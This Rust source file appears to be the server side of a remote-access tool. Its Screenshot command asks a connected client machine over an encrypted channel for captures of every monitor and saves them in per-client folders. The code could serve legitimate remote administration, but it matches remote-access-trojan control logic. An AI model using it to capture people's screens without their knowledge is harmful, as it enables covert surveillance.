use std::{any::Any, borrow::BorrowMut, fmt::format};

use chrono::{DateTime, Local};
use tokio::fs::{self, File};

use crate::connector_server::{instance::Instance, utils::file_util::create_file};

#[derive(Debug, Clone)]

pub struct Screenshot {
    name: String,
}

impl Screenshot {
    pub fn new() -> Screenshot {
        Screenshot {
            name: "screenshot".to_string(),
        }
    }
    pub fn get_name(&self) -> String {
        self.name.clone()
    }
    pub async fn run(&self, instance: &mut Instance) {
        instance
            .send_hybrid_encryption(
                instance.get_public_key().clone(),
                self.name.as_bytes().to_vec(),
            )
            .await;
        let message = instance.accept_message().await;
        let number_of_screenshots = String::from_utf8(message.as_slice().to_vec())
            .unwrap()
            .parse::<i32>()
            .unwrap();
        let mut screenshot_files = Vec::new();
        //for each monitor create files
        for index in 0..number_of_screenshots {
            let local: DateTime<Local> = Local::now();
            let formatted_local = local.format("%Y-%m-%d %H:%M:%S").to_string();
            //make it be more specific with moni name
            let path = format!(
                "users/screenshots/{}/screenshot{index}{formatted_local}.png",
                instance.get_path()
            );
            create_file(path.as_str()).await;
            screenshot_files.push(path);
        }
        //for each monitor write in path screenshot
        for index in 0..number_of_screenshots {
            let message = instance.accept_message().await;
            fs::write(screenshot_files.get(index as usize).unwrap(), message)
                .await
                .unwrap();
        }
    }
}
